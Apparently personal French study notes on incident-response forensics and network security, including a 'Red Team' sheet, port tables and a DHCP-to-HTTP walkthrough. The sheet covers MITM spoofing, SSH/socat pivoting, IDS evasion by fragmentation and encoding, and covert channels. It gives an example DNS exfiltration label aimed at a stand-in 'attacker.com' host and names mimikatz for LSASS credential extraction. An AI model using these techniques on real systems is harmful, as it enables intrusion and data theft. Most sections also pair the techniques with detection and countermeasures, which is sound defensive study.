  - Monter l’image en lecture seule (`mount -o ro,loop image.img /mnt/point`).
  - Examiner `/var/log/` (auth.log, syslog, messages), `/etc/cron*`, `~/.ssh/authorized_keys`, `/home/*/.bash_history`.
  - Examiner `/proc` images et `dmesg` dumps si disponibles.
  - Rechercher fichiers récents ou binaires modifiés (`find / -mtime -n`), analyse de hashes pour détecter binaires modifiés.
- **Outils**
  - `sleuthkit` (`fls`, `icat`), `autopsy`, `bulk_extractor`, `strings`, `rkhunter`.
- **Glossaire rapide**
  - **Image disque** : copie bit-for-bit d’un media de stockage.
  - **sleuthkit / autopsy** : outils pour l’analyse forensic de systèmes de fichiers.
  - **bulk_extractor** : extraire artefacts (emails, URLs) sans montage.

---

## 4) Détecter un implant persistant déguisé

- **Où regarder**
  - Services et drivers (Windows: `services.msc`, Linux: `systemd` units).
  - Entrées de démarrage (`Run` keys, `Startup` folders, `cron`, `systemd timers`).
  - Binaries dans chemins non standards (`/tmp`, `C:\Windows\Temp`) et scripts encodés.
- **Indicateurs**
  - Binaries signés non correspondants, processus avec connexions réseau atypiques, DLLs injectées, hooks.
  - Timestamps incohérents ou fichiers effacés récemment (MFT $LogFile, USN Journal).
- **Glossaire rapide**
  - **USN Journal** : journal de modifications sur volume NTFS.
  - **DLL injection** : technique pour exécuter code dans l’espace mémoire d’un autre processus.

---

## 5) Extraire des secrets depuis la mémoire — méthodes & limites

- **Méthodes**
  - Dump mémoire (`winpmem`, `LiME` for Linux), analyser avec `Volatility`, `Rekall`.
  - Chercher patterns (clé privée PEM, mots de passe en clair, tokens) via `strings` et regex.
  - Utiliser outils spécialisés (`mimikatz`, `pypykatz`) pour extraire credentials de LSASS (Windows).
- **Limites & éthique**
  - Extraction peut violer politiques; nécessite autorisation.
  - Résultats parfois volatiles/incomplets, chiffrement en mémoire peut réduire efficacité.
- **Glossaire rapide**
  - **Volatility** : framework d’analyse de mémoire pour extraire artefacts.
  - **LiME** : Linux Memory Extractor pour dumper RAM.

---

## 6) Outils pour analyse réseau / pcap et signatures recherchées

- **Outils**
  - `Wireshark`/`tshark`, `Zeek` (Bro), `NetworkMiner`, `tcpdump`.
- **Signatures / indicateurs**
  - Connexions périodiques (beacons), DNS anomalies (long labels, high entropy), exfiltration via DNS, HTTP(s) with unusual User-Agent, uncommon ports, TLS with self-signed certs.
  - Protocol anomalies (HTTP over non-standard ports, DNS over HTTP(s), DNS TXT data).
- **Glossaire rapide**
  - **Beacon** : communication périodique d’un implant vers C2.
  - **Zeek** : moteur d’analyse réseau générant logs riches à partir de pcap.

---

## 7) Corréler logs réseau et logs hôte pour reconstituer parcours d’un attaquant

- **Approche**
  - Normaliser timestamps (UTC), corréler évènements par IP, port, PID, hashes de fichiers.
  - Identifier séquences : recon → exploitation → post-exploit → exfiltration.
  - Utiliser SIEM pour centraliser (Splunk, ELK) et écrire queries pour chaînes d’événements.
- **Exemple**
  - Un login suspect (event log) suivi d’une connexion sortante du processus identique dans pcap → probable exfiltration.
- **Glossaire rapide**
  - **SIEM** : corrélation et agrégation centralisée de logs pour détection.
  - **UTC** : temps universel coordonné, standard pour corrélation temporelle.

---

## 8) Analyse d’un binaire suspect (strings, static analysis, sandbox)

- **Étapes**
  - Commencer par `strings`, `file`, `ltrace`/`strace` (Linux) ou `PEiD`, `strings`, `Dependency Walker` (Windows).
  - Analyser métadonnées (compilation date, sections), rechercher URL/IP encodés, routines de network.
  - Si safe, exécuter dans sandbox/VM instrumentée (Cuckoo) pour observer comportement réseau et fichiers créés.
- **Glossaire rapide**
  - **Static analysis** : analyser binaire sans l’exécuter.
  - **Cuckoo Sandbox** : environnement d’analyse dynamique automatisée de malwares.

---

## 9) Utiliser des hash (MD5/SHA) pour l’intégrité des preuves

- **But**
  - Garantir que l’image/les fichiers n’ont pas été altérés depuis acquisition.
- **Méthode**
  - Calculer hash (SHA256 recommandé) immédiatement après acquisition, stocker en double (rapport & média) et recalculer après chaque copie/transfert.
- **Glossaire rapide**
  - **SHA256** : fonction de hachage cryptographique recommandée pour intégrité.
  - **Hashing** : produire empreinte fixe d’un fichier pour vérification d’intégrité.

---

## 10) Exemple de rapport forensique — sections et niveau de détail

- **Sections essentielles**
  - Résumé exécutif (impact & recommandations), Contexte & scope, Méthodologie (outils & versions), Evidence collected (hashes, chemins), Timeline d’évènements, Findings détaillés (artefacts, PoC), Remediation recommendations, Annexes (commandes, scripts, captures).
- **Niveau de détail**
  - Technique pour les équipes SOC/IR (commandes, logs) + résumé compréhensible pour management.
  - Inclure preuves chiffrées (hashes), timestamps, et capturer screenshots anonymisés si nécessaire.
- **Glossaire rapide**
  - **SOC (Security Operations Center)** : équipe qui surveille et réagit aux incidents.
  - **IR (Incident Response)** : processus de réponse à incident de sécurité.

---



# Réseau — Fiche Red Team


## 1) Pile TCP/IP — différence entre TCP et UDP, handshakes, flags importants

- **TCP vs UDP**
  - **TCP** : protocole orienté connexion, fiable (handshake, retransmission), ordering des paquets.
  - **UDP** : protocole sans connexion, faible overhead, utilisé pour DNS, DNS over UDP, streaming.
- **Handshake TCP**
  - Three-way handshake : `SYN` -> `SYN/ACK` -> `ACK`.
  - Termination via `FIN`/`ACK` ou `RST`.
- **Flags importants**
  - `SYN`, `ACK`, `FIN`, `RST`, `PSH`, `URG`.
- **Glossaire rapide**
  - **Handshake** : échange initial pour établir connexion TCP.
  - **RST** : reset connection (force close).
  - **PSH** : push flag signale données à délivrer immédiatement.

---

## 2) MITM — ARP spoofing, DHCP spoofing, DNS spoofing

- **ARP spoofing**
  - Lier adresse MAC de l’attaquant à l’IP d’un autre hôte (ex: gateway) pour intercepter trafic local.
- **DHCP spoofing**
  - Répondre à requêtes DHCP avec mauvaises configurations (gateway/DNS) pour rediriger trafic.
- **DNS spoofing**
  - Poisoning cache DNS local ou manipulation de résolutions pour pointer vers IP malveillante.
- **Contre-mesures**
  - DHCP snooping, dynamic ARP inspection, DNSSEC, use of static ARP entries in critical hosts.
- **Glossaire rapide**
  - **ARP** : résout IP -> MAC sur réseaux locaux.
  - **DNSSEC** : sécurité pour DNS assurant intégrité des réponses DNS.

---

## 3) NAT, PAT, et translation de ports

- **NAT (Network Address Translation)**
  - Traduction d’adresses privées vers adresse publique (souvent sur routeur).
- **PAT (Port Address Translation)**
  - Plusieurs hôtes privés partagent une même IP publique via mapping ports (NAT overload).
- **Fonctionnement**
  - Router maintient table NAT : (privateIP:port) <-> (publicIP:port).
- **Glossaire rapide**
  - **NAT table** : table de correspondance des connexions traduites.
  - **Port forwarding** : redirection d’un port public vers hôte interne.

---

## 4) Port forwarding / pivoting depuis hôte compromis (SSH tunneling, proxychains, socat, RPort)

- **SSH tunneling**
  - `ssh -R` (remote), `ssh -L` (local) pour forwarder ports; `ssh -D` pour SOCKS proxy.
- **Socat**
  - Redirection flexible (TCP/UDP), création de tunnels chiffrés, relays.
- **Proxychains / RPort**
  - Forcer applications à passer via proxy local (proxychains) ou utiliser outils dédiés de pivoting.
- **Glossaire rapide**
  - **SOCKS proxy** : protocole de proxy générique pour TCP/UDP via tunnel.
  - **ssh -D** : crée un proxy SOCKS local.

---

## 5) MTU, fragmentation, et abus pour contourner détections

- **MTU (Maximum Transmission Unit)**
  - Taille maximale d’une trame IP; fragmentation découpe paquets plus grands en fragments.
- **Abus / contournement**
  - Fragmenter payloads d’attaque pour échapper aux signatures basées sur contenu (IDS reassembly failures).
  - Manipuler `DF` (Don't Fragment) bit pour forcer fragmentation comportement.
- **Glossaire rapide**
  - **Fragmentation** : division d’un paquet IP en plusieurs fragments pour transmission.
  - **DF bit** : indique si le paquet peut être fragmenté.

---

## 6) Quoi regarder dans un pcap pour repérer un C2

- **Signes typiques**
  - Connexions périodiques (beacons) avec intervalle régulier.
  - Trafics chiffrés non-standards (TLS with uncommon ciphers, odd SNI), User-Agent suspicious.
  - DNS anomalies (requetes TXT, big labels, NXDOMAIN patterns).
  - Longues connexions HTTPS to unknown hosts with low data transfer.
- **Outils**
  - Wireshark, Zeek logs, Splunk/ELK with PCAP ingestion, Moloch/Arkime.
- **Glossaire rapide**
  - **SNI** : Server Name Indication — extension TLS indiquant nom d’hôte demandé.
  - **NXDOMAIN** : réponse DNS signifiant nom inconnu; pattern useful for DGA detection.

---

## 7) Contournement IDS/IPS réseau (encodage, fragmentation, tunnels chiffrés)

- **Techniques**
  - Encodage payload (base64, XOR), fragmentation, polymorphism, using covert channels (DNS, ICMP).
  - Utiliser TLS tunnels (HTTPS) or DNS-over-HTTPS to hide C2.
- **Défenses**
  - Reassembly des fragments, deep packet inspection (DPI), TLS inspection, anomaly detection baselines.
- **Glossaire rapide**
  - **DPI** : Deep Packet Inspection — analyse détaillée du contenu des paquets.
  - **Covert channel** : canal de communication caché non prévu pour exfiltration.

---

## 8) DNS exfiltration et détection

- **Méthodes**
  - Encoder données en labels DNS (ex: `dGhpcy1pcw==.exfil.attacker.com`) et requêter via DNS.
  - Utiliser requêtes TXT pour transporter payloads plus grands.
- **Détection**
  - Regarder entropie des labels, fréquence/domaines nouvellement créés, volume de requêtes vers domaines externes.
  - Implement DNS logging and rate limits, block suspicious domains.
- **Glossaire rapide**
  - **Label** : segment d’un nom de domaine séparé par points.
  - **Entropy** : mesure d’aléa d’une chaîne; élevée pour données encodées.

---

## 9) Canal covert (DNS, ICMP, HTTPs) — tradeoffs OPSEC

- **Options**
  - **DNS** : petit débit, discret, traverses many networks, peut être détecté par DNS logs.
  - **ICMP** : souvent overlooked but monitored; low throughput.
  - **HTTPS** : high throughput, blends with normal traffic but requires C2 infrastructure to mimic legit TLS.
- **Tradeoffs**
  - DNS/ICMP lower bandwidth but stealthier; HTTPS higher throughput but riskier if TLS fingerprinting/inspection in place.
- **Glossaire rapide**
  - **TLS fingerprinting** : identifier clients/servers based on TLS handshake metadata.
  - **Throughput** : débit de données transférées.

---

## 10) Concevoir règles de détection réseau pour comportements Red Team

- **Règles pratiques**
  - Détecter beacons : alert if periodic connections to suspicious domains/IPs.
  - Analyse de User-Agent et SNI anomalies (rare combo of headers).
  - Monitor DNS: high entropy labels, many subdomains, sudden spikes in NXDOMAIN.
  - Baseline normal traffic per host and alert deviations (bytes/time, session count).
- **Glossaire rapide**
  - **Baseline** : profil du comportement réseau normal d’un hôte/environnement.
  - **SNI anomaly** : SNI value oddness (mismatch between domain and certificate).

---

## 11) Modèles OSI et TCP/IP — compréhension et correspondances

- **Modèle OSI (Open Systems Interconnection)**  
    Découpe théorique de la communication réseau en **7 couches** :
    1. **Physique** – Transmission électrique/optique des bits (câbles, fibres, Wi-Fi, répéteurs).  
        → _Ex : Ethernet, RJ45, ondes radio._
    2. **Liaison de données (Data Link)** – Communication entre machines sur le même réseau local (adresses MAC, trames).  
        → _Ex : Ethernet, Wi-Fi (802.11), ARP._
    3. **Réseau (Network)** – Routage et adressage entre réseaux (IP, ICMP).  
        → _Ex : IPv4/IPv6, ICMP (ping), OSPF._
    4. **Transport** – Gestion de bout en bout (fiabilité, flux, segmentation).  
        → _Ex : TCP, UDP._
    5. **Session** – Établissement, maintien et fermeture des connexions.  
        → _Ex : gestion de session RPC, NetBIOS._
    6. **Présentation** – Formatage et chiffrement des données.  
        → _Ex : SSL/TLS, JPEG, ASCII, JSON._
    7. **Application** – Interface utilisateur et protocoles applicatifs.  
        → _Ex : HTTP, DNS, FTP, SSH._
- **Modèle TCP/IP (simplifié en 4 couches)**  
    Représente une implémentation plus pratique utilisée sur Internet :
    1. **Accès réseau (Network Interface)** → couches 1 et 2 OSI  
        _Ethernet, ARP, PPP._
    2. **Internet** → couche 3 OSI  
        _IP, ICMP, IGMP._
    3. **Transport** → couche 4 OSI  
        _TCP, UDP._
    4. **Application** → couches 5–7 OSI  
        _HTTP, SMTP, DNS, SSH._

- **Glossaire rapide**
    
    - **Encapsulation** : chaque couche ajoute son propre en-tête avant transmission.
    - **PDU (Protocol Data Unit)** : nom donné à la donnée selon la couche (bit, trame, paquet, segment).
    - **Dé-encapsulation** : processus inverse lors de la réception.
    - **TCP/IP** : modèle plus simple, pratique et implémenté dans tous les systèmes modernes.
    - **OSI** : modèle conceptuel utile pour enseigner et diagnostiquer (décomposition par couche).

# **Ports réseau incontournables à connaître**

## 🌐 **Services Web**

|Port|Protocole|Description|
|---|---|---|
|**80**|HTTP|Web non chiffré|
|**443**|HTTPS|Web chiffré TLS|
|**8080**|HTTP alt|Proxy, Tomcat, API|
|**8443**|HTTPS alt|Admin panels, APIs|

---

## 🖥️ **Administration / Remote**

| Port     | Protocole | Description               |
| -------- | --------- | ------------------------- |
| **22**   | SSH       | Accès distant sécurisé    |
| **23**   | Telnet    | Accès distant non chiffré |
| **3389** | RDP       | Remote Desktop Windows    |
| **5900** | VNC       | Bureau à distance         |
| 123/UDP  | NTP       | Synchronisation horaire   |

---

## 📁 **Fichiers / Partage**

|Port|Protocole|Description|
|---|---|---|
|**21**|FTP|Transfert fichiers|
|**20**|FTP-data|Mode actif|
|**22**|SFTP|FTP over SSH|
|**69**|TFTP|FTP simplifié (UDP)|
|**137-139**|NetBIOS|Partage Windows legacy|
|**445**|SMB|Partages Windows moderne|
|**2049**|NFS|Partage Linux|

---

## 🖧 **DNS / Réseau**

|Port|Protocole|Description|
|---|---|---|
|**53**|DNS|Résolution de noms|
|**67/68**|DHCP|Attribution IP|
|**161/162**|SNMP|Supervision d’équipements|
|**179**|BGP|Routing inter-AS|

---

## 💳 **Directory / Auth**

|Port|Protocole|Description|
|---|---|---|
|**389**|LDAP|Annuaire non chiffré|
|**636**|LDAPS|Annuaire chiffré|
|**88**|Kerberos|Authentification AD|
|**464**|Kerberos passwd|Changement mot de passe|

---

## 🧪 **Bases de données**

|Port|Protocole|Description|
|---|---|---|
|**3306**|MySQL / MariaDB|Base SQL|
|**5432**|PostgreSQL|Base SQL|
|**1433**|MSSQL|Base SQL Windows|
|**27017**|MongoDB|Base NoSQL|
|**6379**|Redis|Cache / KV store|

---

## 🔧 **Divers importants**

| Port                   | Protocole     | Description       |
| ---------------------- | ------------- | ----------------- |
| **1883**               | MQTT          | IoT               |
| **11211**              | Memcached     | Cache             |
| **5000 / 8000 / 3000** | Web dev       | APIs / frameworks |
| **9200**               | Elasticsearch | Search DB         |
| **5601**               | Kibana        | Interface ELK     |

## 🔐 **Authentification & Kerberos**

|Port|Protocole|Description|
|---|---|---|
|**88/TCP-UDP**|Kerberos|Authentification AD (tickets TGT / TGS)|
|**464/TCP-UDP**|kpasswd|Changement / reset de mot de passe Kerberos|

---

## 📚 **Annuaire LDAP (recherche d’objets AD)**

|Port|Protocole|Description|
|---|---|---|
|**389/TCP-UDP**|LDAP|Annuaire non chiffré|
|**636/TCP**|LDAPS|LDAP chiffré TLS|
|**3268/TCP**|Global Catalog|Requêtes LDAP sur tout le domaine|
|**3269/TCP**|Global Catalog SSL|GC via LDAPS|

---

## 🖧 **RPC, DCE/RPC et services AD distribués**

|Port|Protocole|Description|
|---|---|---|
|**135/TCP**|RPC Endpoint Mapper|Découverte des services RPC|
|**49152–65535/TCP**|RPC Dynamic Ports|Ports dynamiques RPC utilisés par AD, DRSUAPI, etc.|

👉 Très utilisé pour la réplication AD (DRS), l’admin distante, la gestion des objets.

---

## 🗂️ **Partage & Découverte Windows**

|Port|Protocole|Description|
|---|---|---|
|**137/UDP**|NetBIOS Name Service|Résolution de noms legacy|
|**138/UDP**|NetBIOS Datagram|Services SMB liés|
|**139/TCP**|NetBIOS Session|SMB ancien|
|**445/TCP**|SMB|Partage fichiers, authentification NTLM, opérations AD|

➡️ **445** est _critique_ pour l’authentification NTLM + beaucoup d’attaques (Pass-the-Hash, SMB relay…).

---

## 🕒 **Synchronisation temporelle (indispensable AD)**

|Port|Protocole|Description|
|---|---|---|
|**123/UDP**|NTP|Synchronisation des DC — crucial pour Kerberos|

---

## 📢 **Group Policy (GPO)**

|Port|Protocole|Description|
|---|---|---|
|**445/TCP**|SMB|Téléchargement des policies (SYSVOL)|
|**135 + RPC dynamiques**|RPC|Application et traitement des GPO|

# **WINRM – Windows Remote Management**

|Port|Protocole|Description|
|---|---|---|
|**5985/TCP**|WinRM HTTP|Remote management non chiffré (HTTP)|
|**5986/TCP**|WinRM HTTPS|Remote management chiffré (HTTPS)|
       
# Processus complet : Du nom de domaine au chargement d’une page web

## Étape 1 : Obtention d'une adresse IP – **DHCP**
1. Le client vérifie s’il dispose déjà d’une adresse IP valide.  
2. S’il n’en a pas, il envoie un **DHCP Discover** en broadcast.  
3. Le serveur DHCP répond avec un **DHCP Offer** contenant une adresse IP proposée.  
4. Le client envoie un **DHCP Request** pour confirmer son choix.  
5. Le serveur répond par un **DHCP ACK**, attribuant officiellement :
   - une adresse IP,
   - un masque de sous-réseau,
   - une passerelle par défaut,
   - des serveurs DNS,
   - une durée de bail.

Cette configuration permet au client d’être pleinement opérationnel sur le réseau.

---

## Étape 2 : Résolution de nom – **DNS**
1. L’utilisateur saisit `exemple.com` dans son navigateur.  
2. Le système vérifie d'abord :
   - le cache DNS du navigateur,
   - le cache DNS de l’OS,
   - le fichier *hosts* local.  
3. S’il n’a pas l’adresse IP, il envoie une requête DNS au résolveur configuré (FAI ou DNS public).  
4. Le résolveur suit une résolution hiérarchique :
   - serveurs racine (.),  
   - serveurs du TLD (`.com`),  
   - serveur faisant autorité pour `exemple.com`.  
5. Une fois l’adresse IP obtenue, elle est renvoyée au client et mise en cache.

---

## Étape 3 : Détermination de la destination – **ARP**
1. Le client compare sa propre adresse IP et son masque avec l’IP du serveur distant.  
2. Deux cas :  
   - **Même réseau local** → ARP pour obtenir directement l’adresse MAC du serveur.  
   - **Réseau distant** → ARP pour obtenir l’adresse MAC de la *passerelle par défaut*.  
3. ARP fonctionne via un **broadcast** : *“Qui a cette adresse IP ? Donne-moi ton adresse MAC.”*  
4. L’hôte ciblé répond avec une réponse ARP contenant son adresse MAC.  
5. Le client peut maintenant encapsuler les trames Ethernet destinées au bon destinataire.

---

## Étape 4 : Établissement du transport – **TCP 3-Way Handshake et routage**
### Three-Way Handshake
1. **SYN** : le client demande l'ouverture d'une connexion.  
2. **SYN-ACK** : le serveur confirme la demande.  
3. **ACK** : le client confirme la confirmation.

La connexion TCP est alors ouverte.

### NAT & PAT
- Si l’utilisateur est derrière un routeur (réseau domestique ou entreprise), le routeur effectue :
  - **NAT** : remplace l’IP privée du client par l’IP publique.
  - **PAT** : crée une association *port interne → port externe* pour permettre le suivi des connexions.

### Routage & transport
- La trame sort du réseau local et traverse plusieurs routeurs.  
- Chaque routeur :
  - lit l’adresse IP de destination,
  - choisit le meilleur chemin via sa table de routage,
  - décrémente le **TTL (Time To Live)** pour éviter les boucles infinies.  
- Si TTL = 0 → paquet détruit + message ICMP "Time Exceeded".

Le paquet finit par atteindre le serveur cible.

---

## Étape 5 : Sécurisation – **TLS**
1. Le client et le serveur initient un **TLS Handshake**, qui contient notamment :
   - la sélection de la version TLS et des suites cryptographiques,
   - l’envoi du certificat du serveur,
   - la vérification du certificat par le client,
   - un échange de clés (souvent via **Diffie-Hellman**),
   - la génération d’une clé symétrique de session.
2. Une fois terminé, **toutes les données sont chiffrées** entre le client et le serveur.

---

## Étape 6 : Requête HTTP – **GET**
1. Le navigateur construit une requête HTTP **GET /page**.  
2. La requête traverse de nouveau :
   - les couches applicatives → transport → réseau → liaison → physique,
   - les routeurs intermédiaires,
   - le serveur cible.  
3. Le serveur reçoit la requête, remonte les couches et l’interprète.

---

## Étape 7 : Réponse & finalisation
1. Le serveur renvoie une **réponse HTTP 200 OK** avec le contenu de la page (HTML, CSS, JS…).  
2. Le navigateur :
   - déchiffre les données via TLS,
   - traite le HTML,
   - télécharge les ressources additionnelles (images, scripts, polices),
   - construit le DOM,
   - affiche la page à l’utilisateur.
3. Une fois les échanges terminés, la connexion TCP peut être fermée via un **4-way handshake** (FIN/ACK).

---
